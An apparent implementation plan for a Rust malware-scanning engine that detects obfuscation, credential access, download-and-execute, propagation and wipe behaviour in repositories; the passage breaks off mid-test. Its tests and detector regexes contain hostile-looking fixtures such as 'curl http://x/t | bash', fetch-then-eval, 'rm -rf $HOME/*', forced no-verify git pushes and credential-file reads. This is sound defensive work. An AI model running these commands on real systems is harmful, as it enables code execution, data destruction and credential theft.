# Capability Engine Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add a campaign-agnostic, static, lexical capability-scoring engine to `wormward-core` that enumerates a repo's auto-run surface and fires near-zero-FP findings on value-independent malware invariants (obfuscation, credential access, network egress, process spawn, download-exec, propagation, on-chain C2 resolution, trailing code, destructive wipe, fake-font, exfil-staging).

**Architecture:** Two new pure modules — `surface.rs` (path→`Surface` classification + package.json lifecycle extraction + one-hop `node ./X.js` reachability) and `capability.rs` (`CapabilityScore` + per-detector lexical scoring + a surface-aware `gate`). `scanner.rs` gains `scan_capabilities`, called alongside `scan_files` on the working tree and every branch tip. Runs additively next to the existing IOC packs. The design source of truth is `docs/superpowers/specs/2026-07-19-capability-engine-design.md` (§4 surfaces, §5 capability patterns, §6 reachability, §7 gate matrix) — consult it for the full pattern vocabulary.

**Tech Stack:** Rust (workspace), `regex`, `serde_json` (promote to a normal dep for package.json parsing), existing `shannon_entropy` from `matchers.rs`, `RepoFiles` abstraction from `repo_files.rs`.

## Global Constraints

- Static & lexical only — **no JS/YAML AST parser**, no new heavy dependencies. Only `serde_json` (already a workspace dep) is promoted from dev to normal.
- Conservative, near-zero-FP: obfuscation is a **prior only for `ConfigFile`/`DerivedScript`**; behavioral surfaces fire on the behavior alone. Generic `process_spawn` alone never fires on a hook/lifecycle/workflow surface.
- Campaign-agnostic findings: `campaign = "generic"`, `kind = FindingKind::Capability`, `severity = Severity::Critical`, `remediable = false`, `signature_id = "capability:<surface>:<top-signal>"`.
- Excluded from the capability pass (in addition to `walk_repo_files`'s `.git`/`node_modules`/`.wormward-backup` prune): any path segment `dist/`, `build/`, `.next/`, `out/`, `coverage/`, `vendor/`, and any `*.min.*` file.
- Reuse `matchers::shannon_entropy`; do not reimplement entropy.
- Success criterion: `cargo test -p wormward-core` and `-p wormward-packs` green; **zero findings** on the clean-corpus fixture; every infected fixture in Task 9 fires.

---

## File Structure

- **Create** `crates/wormward-core/src/surface.rs` — `Surface` enum, `classify`, `lifecycle_scripts`, `derived_targets`, `is_excluded_path`.
- **Create** `crates/wormward-core/src/capability.rs` — `CapabilityScore`, `score`, `gate`, `is_exfil_staging`.
- **Modify** `crates/wormward-core/src/finding.rs` — add `FindingKind::Capability`.
- **Modify** `crates/wormward-core/src/scanner.rs` — `scan_capabilities`, wired into `scan_repo` + `deep_scan_repo`.
- **Modify** `crates/wormward-core/src/lib.rs` — `pub mod surface; pub mod capability;` + re-exports.
- **Modify** `crates/wormward-core/Cargo.toml` — move `serde_json` to `[dependencies]`.
- **Modify** `crates/wormward-packs/src/polinrider/analyzer.rs` — broaden `marker_re` for the ESM shim.
- **Create** `crates/wormward-core/tests/capability_integration.rs` — campaign-agnostic integration + clean-corpus regression.

---

## Task 1: `FindingKind::Capability`

**Files:**
- Modify: `crates/wormward-core/src/finding.rs:16-24`
- Test: same file, `#[cfg(test)] mod tests`

**Interfaces:**
- Produces: `FindingKind::Capability` (serializes to `"capability"`).

- [ ] **Step 1: Write the failing test** (add to `finding.rs` tests)

```rust
#[test]
fn capability_kind_serializes() {
    let json = serde_json::to_string(&FindingKind::Capability).unwrap();
    assert_eq!(json, "\"capability\"");
}
```

- [ ] **Step 2: Run to verify it fails**

Run: `cargo test -p wormward-core finding::tests::capability_kind_serializes`
Expected: FAIL — `no variant named Capability`.

- [ ] **Step 3: Add the variant**

In the `FindingKind` enum add `Capability` as the last variant.

- [ ] **Step 4: Run to verify it passes**

Run: `cargo test -p wormward-core finding::tests::capability_kind_serializes`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add crates/wormward-core/src/finding.rs
git commit -m "feat(core): add FindingKind::Capability"
```

---

## Task 2: `Surface` enum + path classification

**Files:**
- Create: `crates/wormward-core/src/surface.rs`
- Modify: `crates/wormward-core/src/lib.rs:1-8` (add `pub mod surface;`)

**Interfaces:**
- Produces:
  - `enum Surface { ConfigFile, LifecycleScript, WorkflowFile, TasksJson, GitHook, PropagationScript, DerivedScript, BinaryAsset }` (derive `Debug, Clone, Copy, PartialEq, Eq`).
  - `fn classify(path: &Path) -> Option<Surface>` — path-based only; returns the file-backed surfaces (`ConfigFile`, `WorkflowFile`, `TasksJson`, `GitHook`, `PropagationScript`, `BinaryAsset`). `LifecycleScript`/`DerivedScript` are synthesized by the scanner, never returned here.
  - `fn is_excluded_path(path: &Path) -> bool` — true for build-output dirs / `*.min.*` (see Global Constraints).

- [ ] **Step 1: Write failing tests**

```rust
#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;
    fn c(p: &str) -> Option<Surface> { classify(Path::new(p)) }

    #[test] fn config_toolchain() { assert_eq!(c("postcss.config.mjs"), Some(Surface::ConfigFile)); }
    #[test] fn config_nested() { assert_eq!(c("packages/web/vite.config.ts"), Some(Surface::ConfigFile)); }
    #[test] fn config_eslintrc() { assert_eq!(c(".eslintrc.js"), Some(Surface::ConfigFile)); }
    #[test] fn config_entry_files() {
        assert_eq!(c("src/index.js"), Some(Surface::ConfigFile));
        assert_eq!(c("App.js"), Some(Surface::ConfigFile));
        assert_eq!(c("truffle.js"), Some(Surface::ConfigFile));
    }
    #[test] fn workflow() { assert_eq!(c(".github/workflows/ci.yml"), Some(Surface::WorkflowFile)); }
    #[test] fn tasks_json() { assert_eq!(c(".vscode/tasks.json"), Some(Surface::TasksJson)); }
    #[test] fn git_hook() { assert_eq!(c(".husky/pre-commit"), Some(Surface::GitHook)); }
    #[test] fn propagation_script() {
        assert_eq!(c("temp_auto_push.bat"), Some(Surface::PropagationScript));
        assert_eq!(c("scripts/deploy.sh"), Some(Surface::PropagationScript));
    }
    #[test] fn binary_asset() { assert_eq!(c("public/fonts/fa-solid-400.woff2"), Some(Surface::BinaryAsset)); }
    #[test] fn svg_is_not_asset() { assert_eq!(c("logo.svg"), None); }
    #[test] fn readme_is_none() { assert_eq!(c("README.md"), None); }
    #[test] fn excludes_build_dirs() {
        assert!(is_excluded_path(Path::new("dist/postcss.config.js")));
        assert!(is_excluded_path(Path::new("app.min.js")));
        assert!(!is_excluded_path(Path::new("src/index.js")));
    }
}
```

- [ ] **Step 2: Run to verify they fail**

Run: `cargo test -p wormward-core surface::`
Expected: FAIL — module/`classify` not found.

- [ ] **Step 3: Implement `surface.rs` (classification part)**

```rust
use std::path::Path;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Surface {
    ConfigFile, LifecycleScript, WorkflowFile, TasksJson,
    GitHook, PropagationScript, DerivedScript, BinaryAsset,
}

const CONFIG_STEMS: &[&str] = &[
    "postcss", "vite", "next", "tailwind", "eslint", "svelte", "nuxt",
    "webpack", "rollup", "babel", "astro", "vitest", "jest", "remix",
    "gatsby-config", "gatsby-node", "vue", "gridsome",
];
const CONFIG_EXTS: &[&str] = &["js", "mjs", "cjs", "ts"];
const ENTRY_BASENAMES: &[&str] = &["index.js", "app.js", "truffle.js"]; // App.js matched case-insensitively
const PROP_EXTS: &[&str] = &["bat", "cmd", "sh", "ps1"];
const ASSET_EXTS: &[&str] = &["woff", "woff2", "ttf", "otf", "eot", "png", "jpg", "jpeg", "gif", "ico"];
const EXCLUDED_DIRS: &[&str] = &["dist", "build", ".next", "out", "coverage", "vendor"];

fn basename(path: &Path) -> String {
    path.file_name().map(|s| s.to_string_lossy().to_lowercase()).unwrap_or_default()
}

pub fn is_excluded_path(path: &Path) -> bool {
    let bn = basename(path);
    if bn.contains(".min.") { return true; }
    path.components().any(|comp| {
        let s = comp.as_os_str().to_string_lossy();
        EXCLUDED_DIRS.iter().any(|d| *d == s)
    })
}

pub fn classify(path: &Path) -> Option<Surface> {
    let bn = basename(path);
    let path_str = path.to_string_lossy().replace('\\', "/").to_lowercase();
    let ext = path.extension().map(|e| e.to_string_lossy().to_lowercase()).unwrap_or_default();

    // WorkflowFile: .github/workflows/*.yml|yaml, .gitlab-ci.yml
    if (path_str.contains(".github/workflows/") && (ext == "yml" || ext == "yaml"))
        || bn == ".gitlab-ci.yml" { return Some(Surface::WorkflowFile); }
    // TasksJson
    if path_str.ends_with(".vscode/tasks.json") || bn == "tasks.json" && path_str.contains(".vscode/") {
        return Some(Surface::TasksJson);
    }
    // GitHook: .husky/* (working-tree .git/hooks handled separately by the scanner)
    if path_str.contains(".husky/") && !bn.is_empty() { return Some(Surface::GitHook); }
    // PropagationScript
    if PROP_EXTS.contains(&ext.as_str()) { return Some(Surface::PropagationScript); }
    // BinaryAsset (svg excluded — not in ASSET_EXTS)
    if ASSET_EXTS.contains(&ext.as_str()) { return Some(Surface::BinaryAsset); }
    // ConfigFile: toolchain stems, .eslintrc.{js,cjs}, entry files
    if CONFIG_EXTS.contains(&ext.as_str()) {
        let stem = bn.trim_end_matches(&format!(".{ext}"));
        // "postcss.config", "vite.config", ...
        if let Some(base) = stem.strip_suffix(".config") {
            if CONFIG_STEMS.contains(&base) { return Some(Surface::ConfigFile); }
        }
        if stem == "gatsby-config" || stem == "gatsby-node" { return Some(Surface::ConfigFile); }
    }
    if bn == ".eslintrc.js" || bn == ".eslintrc.cjs" { return Some(Surface::ConfigFile); }
    if ENTRY_BASENAMES.contains(&bn.as_str()) { return Some(Surface::ConfigFile); }

    None
}
```

Add `pub mod surface;` to `lib.rs`. Note: `App.js` lowercases to `app.js` which is in `ENTRY_BASENAMES` — covered. Refine any test that fails during Step 4.

- [ ] **Step 4: Run to verify they pass**

Run: `cargo test -p wormward-core surface::`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add crates/wormward-core/src/surface.rs crates/wormward-core/src/lib.rs
git commit -m "feat(core): add Surface enum and path classification"
```

---

## Task 3: package.json lifecycle extraction + one-hop reachability

**Files:**
- Modify: `crates/wormward-core/src/surface.rs`
- Modify: `crates/wormward-core/Cargo.toml:8-17` (add `serde_json = { workspace = true }` to `[dependencies]`)

**Interfaces:**
- Produces:
  - `fn lifecycle_scripts(package_json: &str) -> Vec<(String, String)>` — `(key, script)` pairs for the lifecycle keys only.
  - `fn derived_targets(command: &str) -> Vec<String>` — local `node|bun|ts-node|tsx <path>.{js,cjs,mjs}` targets found in a command/step/file string.
- Consumes: nothing new.

- [ ] **Step 1: Write failing tests**

```rust
#[test]
fn lifecycle_extracts_only_lifecycle_keys() {
    let pj = r#"{"scripts":{"build":"vite build","postinstall":"node setup_bun.js","test":"jest"}}"#;
    let got = lifecycle_scripts(pj);
    assert_eq!(got, vec![("postinstall".to_string(), "node setup_bun.js".to_string())]);
}
#[test]
fn lifecycle_handles_no_scripts() {
    assert!(lifecycle_scripts(r#"{"name":"x"}"#).is_empty());
    assert!(lifecycle_scripts("not json").is_empty());
}
#[test]
fn derived_targets_bare_and_relative() {
    assert_eq!(derived_targets("node setup_bun.js"), vec!["setup_bun.js"]);
    assert_eq!(derived_targets("bun ./scripts/x.mjs && echo ok"), vec!["scripts/x.mjs"]);
    assert!(derived_targets("node --version").is_empty());
    assert!(derived_targets("vite build").is_empty());
}
```

- [ ] **Step 2: Run to verify they fail**

Run: `cargo test -p wormward-core surface::tests::lifecycle -- --list && cargo test -p wormward-core surface::tests::derived`
Expected: FAIL — functions not found.

- [ ] **Step 3: Implement + add dep**

Add to `Cargo.toml` `[dependencies]`: `serde_json = { workspace = true }` (and remove the dev-dependency duplicate if it now conflicts — keeping it in `[dependencies]` is sufficient for tests too).

```rust
use std::sync::OnceLock;
use regex::Regex;

const LIFECYCLE_KEYS: &[&str] = &[
    "preinstall", "install", "postinstall", "prepare",
    "prepublish", "prepublishOnly", "prepack", "postpack",
];

pub fn lifecycle_scripts(package_json: &str) -> Vec<(String, String)> {
    let v: serde_json::Value = match serde_json::from_str(package_json) {
        Ok(v) => v, Err(_) => return Vec::new(),
    };
    let scripts = match v.get("scripts").and_then(|s| s.as_object()) {
        Some(o) => o, None => return Vec::new(),
    };
    LIFECYCLE_KEYS.iter().filter_map(|k| {
        scripts.get(*k).and_then(|val| val.as_str()).map(|s| (k.to_string(), s.to_string()))
    }).collect()
}

fn derived_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(
        r#"(?:^|[\s;&|])(?:node|bun|ts-node|tsx)\s+(?:--?\S+\s+)*['"]?((?:\.?/)?[\w.@-][\w./@-]*\.(?:c|m)?js)"#
    ).unwrap())
}

pub fn derived_targets(command: &str) -> Vec<String> {
    derived_re().captures_iter(command)
        .map(|c| c[1].trim_start_matches("./").to_string())
        .collect()
}
```

- [ ] **Step 4: Run to verify they pass**

Run: `cargo test -p wormward-core surface::`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add crates/wormward-core/src/surface.rs crates/wormward-core/Cargo.toml
git commit -m "feat(core): lifecycle-script extraction and one-hop reachability targets"
```

---

## Task 4: `CapabilityScore` + core detectors (obfuscation, credential, network, spawn, magic-mismatch)

**Files:**
- Create: `crates/wormward-core/src/capability.rs`
- Modify: `crates/wormward-core/src/lib.rs` (add `pub mod capability;`)

**Interfaces:**
- Consumes: `surface::Surface`, `matchers::shannon_entropy`.
- Produces:
  - `struct CapabilityScore { obfuscation, credential_access, network_egress, process_spawn, magic_mismatch, download_exec, propagation, on_chain_resolve, trailing_code, destructive_wipe: bool, evidence: Vec<String> }` (derive `Debug, Default, Clone, PartialEq`).
  - `fn score(content: &str, surface: Surface) -> CapabilityScore` — Task 4 fills the first five fields; Task 5 fills the rest.

Detector patterns: use the vocabulary in spec §5. Each detector is a `fn(content: &str) -> bool` (some take `surface`). Represent evidence by pushing the human label of each true signal.

- [ ] **Step 1: Write failing tests** (core detectors + struct)

```rust
#[cfg(test)]
mod tests {
    use super::*;
    use crate::surface::Surface;

    #[test] fn obfuscation_global_bracket() {
        assert!(score("global['!']='8-270-2';var _$_1e42=[];", Surface::ConfigFile).obfuscation);
    }
    #[test] fn obfuscation_dot_and_fromcharcode() {
        assert!(score("global.o='5';String.fromCharCode(104,105,106,107,108);", Surface::ConfigFile).obfuscation);
    }
    #[test] fn obfuscation_esm_shim() {
        assert!(score("global['r']=require;const require=createRequire(import.meta.url);", Surface::DerivedScript).obfuscation);
    }
    #[test] fn clean_config_not_obfuscated() {
        assert!(!score("export default { plugins: { tailwindcss: {} } };\n", Surface::ConfigFile).obfuscation);
    }
    #[test] fn credential_access() {
        assert!(score("const t=process.env.NPM_TOKEN;fs.readFileSync('~/.aws/credentials')", Surface::LifecycleScript).credential_access);
    }
    #[test] fn network_egress() {
        assert!(score("const https=require('https');fetch('http://x')", Surface::ConfigFile).network_egress);
    }
    #[test] fn process_spawn() {
        assert!(score("child_process.spawn('node',['-e',code])", Surface::DerivedScript).process_spawn);
    }
    #[test] fn magic_mismatch_only_on_binary_asset() {
        assert!(score("var x=require('fs');eval(y)", Surface::BinaryAsset).magic_mismatch);
        assert!(!score("var x=require('fs');eval(y)", Surface::ConfigFile).magic_mismatch);
    }
}
```

- [ ] **Step 2: Run to verify they fail**

Run: `cargo test -p wormward-core capability::`
Expected: FAIL — module not found.

- [ ] **Step 3: Implement `capability.rs` core**

```rust
use std::sync::OnceLock;
use regex::Regex;
use crate::matchers::shannon_entropy;
use crate::surface::Surface;

#[derive(Debug, Default, Clone, PartialEq)]
pub struct CapabilityScore {
    pub obfuscation: bool,
    pub credential_access: bool,
    pub network_egress: bool,
    pub process_spawn: bool,
    pub magic_mismatch: bool,
    pub download_exec: bool,
    pub propagation: bool,
    pub on_chain_resolve: bool,
    pub trailing_code: bool,
    pub destructive_wipe: bool,
    pub evidence: Vec<String>,
}

fn re(pat: &str) -> Regex { Regex::new(pat).unwrap() }
macro_rules! lazy_re { ($f:ident, $pat:expr) => {
    fn $f() -> &'static Regex { static R: OnceLock<Regex> = OnceLock::new(); R.get_or_init(|| re($pat)) }
};}

// --- Obfuscation ---
lazy_re!(global_dyn_re, r"(?:global|globalThis|process)\s*(?:\[|\.)\s*['\w!]+\s*\]?\s*=");
lazy_re!(esm_shim_re, r"global\s*(?:\[[^\]]+\]|\.\w+)\s*=\s*(?:require|module)\b|createRequire\s*\(\s*import\.meta\.url");
lazy_re!(charcode_re, r"String\.fromCharCode\s*\(\s*\d+(?:\s*,\s*\d+){3,}");
lazy_re!(decoder_re, r"_\$_[0-9a-f]{4,}");
lazy_re!(evalish_re, r"\beval\s*\(|new\s+Function\s*\(|\batob\s*\(");

fn obfuscation(content: &str) -> bool {
    if global_dyn_re().is_match(content) && (decoder_re().is_match(content) || charcode_re().is_match(content) || evalish_re().is_match(content)) { return true; }
    if esm_shim_re().is_match(content) { return true; }
    if charcode_re().is_match(content) || decoder_re().is_match(content) { return true; }
    // long single line (not data:/URL) OR high-entropy tail
    if content.lines().any(|l| l.len() > 500 && !l.contains("data:") && !l.trim_start().starts_with("http")) { return true; }
    let b = content.as_bytes();
    shannon_entropy(&b[b.len().saturating_sub(512)..]) > 5.0
}

// --- CredentialAccess ---
lazy_re!(cred_re, r"\.aws/credentials|\.ssh/|\.npmrc|\.git-credentials|Object\.keys\(\s*process\.env|process\.env\.(?:NPM_TOKEN|GITHUB_TOKEN|GH_TOKEN|AWS_SECRET|AWS_ACCESS_KEY)|security\s+find-generic-password|Login Data|logins\.json");
fn credential_access(content: &str, surface: Surface) -> bool {
    if cred_re().is_match(content) { return true; }
    matches!(surface, Surface::WorkflowFile) && content.contains("${{ secrets.")
}

// --- NetworkEgress ---
lazy_re!(net_re, r#"require\(\s*['"](?:https?|net|dgram|tls)['"]|from\s+['"](?:node:)?(?:https?|net|dgram|tls)['"]|\bfetch\s*\(|\baxios\b|XMLHttpRequest|\bWebSocket\b"#);
lazy_re!(url_re, r#"https?://[\w.-]+"#);
fn network_egress(content: &str, surface: Surface) -> bool {
    net_re().is_match(content) || (matches!(surface, Surface::ConfigFile) && url_re().is_match(content))
}

// --- ProcessSpawn ---
lazy_re!(spawn_re, r"child_process|\bspawn\s*\(|\bexecSync\s*\(|\bexec\s*\(|Bun\.spawn(?:Sync)?\s*\(");
fn process_spawn(content: &str) -> bool { spawn_re().is_match(content) }

// --- MagicMismatch (only meaningful when surface == BinaryAsset) ---
lazy_re!(js_tokens_re, r"\brequire\s*\(|\beval\s*\(|\bglobal\b|fromCharCode|\bfunction\b|module\.exports");
fn magic_mismatch(content: &str, surface: Surface) -> bool {
    matches!(surface, Surface::BinaryAsset) && js_tokens_re().is_match(content)
}

pub fn score(content: &str, surface: Surface) -> CapabilityScore {
    let mut s = CapabilityScore::default();
    if obfuscation(content) { s.obfuscation = true; s.evidence.push("obfuscation".into()); }
    if credential_access(content, surface) { s.credential_access = true; s.evidence.push("credential-access".into()); }
    if network_egress(content, surface) { s.network_egress = true; s.evidence.push("network-egress".into()); }
    if process_spawn(content) { s.process_spawn = true; s.evidence.push("process-spawn".into()); }
    if magic_mismatch(content, surface) { s.magic_mismatch = true; s.evidence.push("magic-mismatch".into()); }
    s // Task 5 extends with the remaining detectors
}
```

Add `pub mod capability;` to `lib.rs`.

- [ ] **Step 4: Run to verify they pass**

Run: `cargo test -p wormward-core capability::`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add crates/wormward-core/src/capability.rs crates/wormward-core/src/lib.rs
git commit -m "feat(core): CapabilityScore + core detectors (obf/cred/net/spawn/magic)"
```

---

## Task 5: New detectors (download-exec, propagation, on-chain, trailing-code, destructive, exfil-staging)

**Files:**
- Modify: `crates/wormward-core/src/capability.rs`

**Interfaces:**
- Produces:
  - `fn is_exfil_staging(content: &str) -> bool` — standalone (not in `CapabilityScore`; used by the scanner on root `*.json`).
  - `score` now fills `download_exec`, `propagation`, `on_chain_resolve`, `trailing_code`, `destructive_wipe`. `propagation` is context-gated by `surface` (see spec §5).

- [ ] **Step 1: Write failing tests**

```rust
#[test] fn download_exec() {
    assert!(score("curl http://x/t | bash", Surface::TasksJson).download_exec);
    assert!(score("const r=await fetch(u);eval(await r.text())", Surface::LifecycleScript).download_exec);
    assert!(!score("curl http://x -o out.txt", Surface::LifecycleScript).download_exec);
}
#[test] fn propagation_git_conjunction() {
    let sh = "git commit --amend --no-verify && git push -uf --no-verify";
    assert!(score(sh, Surface::PropagationScript).propagation);
    assert!(!score("git push origin main", Surface::PropagationScript).propagation);
}
#[test] fn propagation_publish_context_gated() {
    // npm publish counts on an auto-run surface, not on a bare propagation script
    assert!(score("npm publish --access public", Surface::LifecycleScript).propagation);
    assert!(!score("npm publish --access public", Surface::PropagationScript).propagation);
}
#[test] fn on_chain_resolve() {
    let js = "fetch('https://api.trongrid.io/v1/accounts/T../transactions').then(r=>{for(i=0;i<n;i++)o+=String.fromCharCode(b.charCodeAt(i)^k);eval(o)})";
    assert!(score(js, Surface::ConfigFile).on_chain_resolve);
}
#[test] fn trailing_code_after_module_body() {
    let cfg = "export default { plugins: {} }\n;(function(){require('https')})()";
    assert!(score(cfg, Surface::ConfigFile).trailing_code);
    assert!(!score("export default { plugins: {} }\n", Surface::ConfigFile).trailing_code);
}
#[test] fn destructive_wipe() {
    assert!(score("rm -rf $HOME/*", Surface::PropagationScript).destructive_wipe);
    assert!(score("shred -uz ~/.bash_history", Surface::GitHook).destructive_wipe);
}
#[test] fn exfil_staging_double_base64() {
    assert!(is_exfil_staging("eyJhIjoiYiJ9\n==trailing"));
    assert!(!is_exfil_staging("{\"a\":\"b\"}"));
}
```

- [ ] **Step 2: Run to verify they fail**

Run: `cargo test -p wormward-core capability::`
Expected: FAIL.

- [ ] **Step 3: Implement the new detectors**

```rust
// --- DownloadExec ---
lazy_re!(fetch_tok_re, r"\bcurl\b|\bwget\b|\bfetch\s*\(|Invoke-WebRequest|\biwr\b|certutil\s+-urlcache|powershell\s+-enc");
lazy_re!(exec_sink_re, r"\|\s*(?:sh|bash)\b|node\s+-e\b|node\s+-\b|chmod\s+\+x|bun\s+run\b|sh\s+-c\b|\beval\s*\(");
fn download_exec(content: &str) -> bool { fetch_tok_re().is_match(content) && exec_sink_re().is_match(content) }

// --- Propagation ---
lazy_re!(amend_re, r"commit\s+.*--amend|--amend");
lazy_re!(forcepush_re, r"push\s+.*(?:--force\b|--force-with-lease\b|-f\b|-uf\b)|-uf\b");
lazy_re!(noverify_re, r"--no-verify");
lazy_re!(publish_re, r"npm\s+publish\b|gh\s+api\s+[^\n]*repos|gh\s+repo\s+create\b|gh\s+workflow\b");
fn propagation(content: &str, surface: Surface) -> bool {
    let git_conj = amend_re().is_match(content) && forcepush_re().is_match(content) && noverify_re().is_match(content);
    if git_conj { return true; }
    // secondary: publish only counts on auto-run surfaces or with credential access
    let auto_run = matches!(surface, Surface::LifecycleScript | Surface::WorkflowFile | Surface::DerivedScript | Surface::GitHook);
    publish_re().is_match(content) && (auto_run || cred_re().is_match(content))
}

// --- OnChainResolve ---
lazy_re!(rpc_re, r"eth_call|eth_getTransactionByHash|/v1/accounts/|trongrid|aptoslabs|bsc-dataseed|\x22method\x22\s*:\s*\x22eth_");
lazy_re!(xor_re, r"charCodeAt[^;]*\^|\^[^;]*charCodeAt|fromCharCode[^;]*\^");
fn on_chain_resolve(content: &str) -> bool {
    rpc_re().is_match(content) && xor_re().is_match(content) && evalish_re().is_match(content)
}

// --- TrailingCode (ConfigFile / DerivedScript only) ---
fn trailing_code(content: &str, surface: Surface) -> bool {
    if !matches!(surface, Surface::ConfigFile | Surface::DerivedScript) { return false; }
    let marker = ["export default", "module.exports"].iter()
        .filter_map(|m| content.rfind(m)).max();
    let tail = match marker { Some(i) => &content[i..], None => return false };
    // find end of that statement heuristically: first newline after a balanced-ish end
    let after = tail.splitn(2, '\n').nth(1).unwrap_or("");
    // trailing executable code = non-comment, non-whitespace tokens with a call/decl
    let meaningful: String = after.lines()
        .filter(|l| { let t = l.trim(); !t.is_empty() && !t.starts_with("//") && !t.starts_with("/*") && !t.starts_with('*') })
        .collect::<Vec<_>>().join("\n");
    meaningful.len() > 8 && (meaningful.contains('(') || meaningful.contains('=') || meaningful.contains("require"))
}

// --- DestructiveWipe ---
lazy_re!(wipe_re, r"rm\s+-rf\s+(?:\$HOME|~|/)|shred\s+-[nuvz]|cipher\s+/W:|del\s+/F\s+/Q");
fn destructive_wipe(content: &str) -> bool { wipe_re().is_match(content) }

// --- ExfilStaging (standalone) ---
pub fn is_exfil_staging(content: &str) -> bool {
    let head: String = content.trim_start().chars().take(16).collect();
    head.starts_with("eyJ") && content.contains("==")
}
```

Extend `score` to set the five new fields (append to the existing `score` body before `s`):

```rust
    if download_exec(content) { s.download_exec = true; s.evidence.push("download-exec".into()); }
    if propagation(content, surface) { s.propagation = true; s.evidence.push("propagation".into()); }
    if on_chain_resolve(content) { s.on_chain_resolve = true; s.evidence.push("on-chain-resolve".into()); }
    if trailing_code(content, surface) { s.trailing_code = true; s.evidence.push("trailing-code".into()); }
    if destructive_wipe(content) { s.destructive_wipe = true; s.evidence.push("destructive-wipe".into()); }
```

- [ ] **Step 4: Run to verify they pass**

Run: `cargo test -p wormward-core capability::`
Expected: PASS. (Tune the `rpc_re`/`xor_re`/`trailing_code` heuristics against the tests if a case misfires; keep them conservative.)

- [ ] **Step 5: Commit**

```bash
git add crates/wormward-core/src/capability.rs
git commit -m "feat(core): download-exec/propagation/on-chain/trailing/wipe/exfil detectors"
```

---

## Task 6: Surface-aware `gate`

**Files:**
- Modify: `crates/wormward-core/src/capability.rs`

**Interfaces:**
- Produces: `fn gate(surface: Surface, s: &CapabilityScore) -> bool` — the §7 matrix.

- [ ] **Step 1: Write failing tests** (the gate truth table)

```rust
fn sc(f: impl Fn(&mut CapabilityScore)) -> CapabilityScore { let mut s = CapabilityScore::default(); f(&mut s); s }

#[test] fn gate_config_requires_prior_and_behavior() {
    assert!(!gate(Surface::ConfigFile, &sc(|s| s.obfuscation = true)));                        // prior only → no
    assert!(gate(Surface::ConfigFile, &sc(|s| { s.obfuscation = true; s.network_egress = true; }))); // prior+behavior → yes
    assert!(gate(Surface::ConfigFile, &sc(|s| { s.trailing_code = true; s.process_spawn = true; }))); // trailing counts as prior
}
#[test] fn gate_lifecycle_behavior_no_obfuscation_needed() {
    assert!(gate(Surface::LifecycleScript, &sc(|s| s.download_exec = true)));
    assert!(gate(Surface::LifecycleScript, &sc(|s| s.propagation = true)));
    assert!(!gate(Surface::LifecycleScript, &sc(|s| s.process_spawn = true))); // bare spawn → no
}
#[test] fn gate_propagation_script() {
    assert!(gate(Surface::PropagationScript, &sc(|s| s.propagation = true)));
    assert!(!gate(Surface::PropagationScript, &sc(|s| s.process_spawn = true)));
}
#[test] fn gate_binary_asset() {
    assert!(gate(Surface::BinaryAsset, &sc(|s| s.magic_mismatch = true)));
}
#[test] fn gate_git_hook_no_bare_spawn() {
    assert!(!gate(Surface::GitHook, &sc(|s| s.process_spawn = true)));
    assert!(gate(Surface::GitHook, &sc(|s| s.download_exec = true)));
}
```

- [ ] **Step 2: Run to verify they fail**

Run: `cargo test -p wormward-core capability::tests::gate`
Expected: FAIL — `gate` not found.

- [ ] **Step 3: Implement `gate`**

```rust
pub fn gate(surface: Surface, s: &CapabilityScore) -> bool {
    let behavioral = s.credential_access || s.network_egress || s.process_spawn || s.on_chain_resolve || s.download_exec;
    match surface {
        Surface::ConfigFile | Surface::DerivedScript => {
            let prior = s.obfuscation || s.trailing_code;
            (prior && behavioral)
                || (matches!(surface, Surface::DerivedScript) && (s.download_exec || s.propagation || s.destructive_wipe))
        }
        Surface::LifecycleScript => {
            s.download_exec || s.propagation || s.on_chain_resolve || s.obfuscation
                || (s.credential_access && s.network_egress) || s.destructive_wipe
        }
        Surface::WorkflowFile => {
            (s.credential_access && s.network_egress) || s.propagation || s.download_exec
        }
        Surface::TasksJson => s.download_exec || s.propagation, // remote-fetch/binary-asset folded into download_exec at scan time
        Surface::GitHook => {
            s.download_exec || s.propagation || (s.credential_access && s.network_egress) || s.obfuscation
        }
        Surface::PropagationScript => s.propagation || s.download_exec || s.destructive_wipe,
        Surface::BinaryAsset => s.magic_mismatch,
    }
}
```

Note: the TasksJson `runOn:folderOpen` precondition and the "remote-fetch token" trigger are enforced by the scanner (Task 7): it only creates a `TasksJson` scoring unit when the file contains a folderOpen trigger, and it treats a lone `curl|wget|certutil|powershell -enc` on that surface as `download_exec` even without an exec sink.

- [ ] **Step 4: Run to verify they pass**

Run: `cargo test -p wormward-core capability::tests::gate`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add crates/wormward-core/src/capability.rs
git commit -m "feat(core): surface-aware capability gate matrix"
```

---

## Task 7: `scan_capabilities` orchestration + scanner wiring

**Files:**
- Modify: `crates/wormward-core/src/scanner.rs`
- Modify: `crates/wormward-core/src/lib.rs` (re-export `scan_capabilities`)

**Interfaces:**
- Consumes: `surface::{classify, lifecycle_scripts, derived_targets, is_excluded_path, Surface}`, `capability::{score, gate, is_exfil_staging}`, `repo_files::RepoFiles`.
- Produces: `fn scan_capabilities(repo: &Path, files: &dyn RepoFiles) -> Vec<Finding>`.

- [ ] **Step 1: Write failing tests** (add to `scanner.rs` tests)

```rust
#[test]
fn capability_flags_obfuscated_config_without_pack() {
    let tmp = TempDir::new().unwrap();
    let repo = make_repo(&tmp);
    fs::write(repo.join("postcss.config.mjs"),
        "export default {};\nglobal['!']='8-270-2';var _$_1e42=[];require('https')").unwrap();
    let files = WorkingTree::new(&repo);
    let f = scan_capabilities(&repo, &files);
    assert!(f.iter().any(|x| x.kind == FindingKind::Capability && x.campaign == "generic"));
}
#[test]
fn capability_reaches_dropped_file() {
    let tmp = TempDir::new().unwrap();
    let repo = make_repo(&tmp);
    fs::write(repo.join("package.json"), r#"{"scripts":{"preinstall":"node setup_bun.js"}}"#).unwrap();
    fs::write(repo.join("setup_bun.js"),
